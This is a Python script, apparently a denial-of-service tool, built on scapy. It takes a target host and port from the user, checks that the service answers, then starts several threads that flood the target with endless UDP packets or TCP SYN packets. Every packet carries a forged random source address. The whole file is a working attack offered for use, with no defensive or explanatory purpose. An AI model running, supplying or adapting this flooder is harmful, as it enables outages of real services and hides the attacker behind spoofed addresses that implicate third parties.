import time
import socket
import random
import threading
import sys
import os
from scapy.all import *
import keyboard

def change_attack():
    choice=input("Choose attack:\n y-UDP\n n-SYN")
    new(choice)

def check_udp():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.sendto(str(random.randint(5,10)).encode('utf8'),(ip,port))
        s.settimeout(0.2)
        data,addr=s.recvfrom(1024)
        if data:
            s.close()
            return True
    except socket.timeout:
        s.close()
        return False

def check_tcp():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((ip,port))
        s.shutdown(socket.SHUT_RDWR)
        return True
    except:
        return False
    finally:
        s.close()
        
def run():
    data = random.randint(10000,100000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            if keyboard.is_pressed("Esc"):
                exit(0)
            randomint=random.randint(1,10)
            randomdata=str(data).encode('utf8') * randomint
            all_ip=IP(dst=ip, src=RandIP())
            udp=UDP(sport=RandShort(),dport=port)
            packet=all_ip/udp/Raw(load=randomdata)
            send(packet)
        except: 
            print("[!] Error!!!")
            exit(0)
        

def run2():
    data = random.randint(10000,100000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            if keyboard.is_pressed("Esc"):
                exit(0)
            all_ip=IP(dst=ip, src=RandIP())
            tcp=TCP(flags="S", sport=RandShort(),dport=port)
            syn=all_ip/tcp
            send(syn)
        except:
            print("[*] Error")
            break
    
def new(choice):
    for y in range(threads):
        if choice == 'y':
            th = threading.Thread(target = run)
            th.start()
        else:
            th = threading.Thread(target = run2)
            th.start()
def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')
test = input()
if test == "n":
    exit(0)
ip = str(input(" Host/Ip:"))
#ip='192.168.0.110'
port = int(input(" Port:"))
#port=80
choice = str(input(" UDP(y/n):"))
#choice='y'
threads = int(input(" Threads:"))
#threads=4

if choice=='y':
    check=check_udp()
elif choice=='n':
    check=check_tcp()
else:
    print("Incorrect key")
    exit(0)
    
if check==False:
        print("Server is not active...")
        exit(0)
        
new(choice)

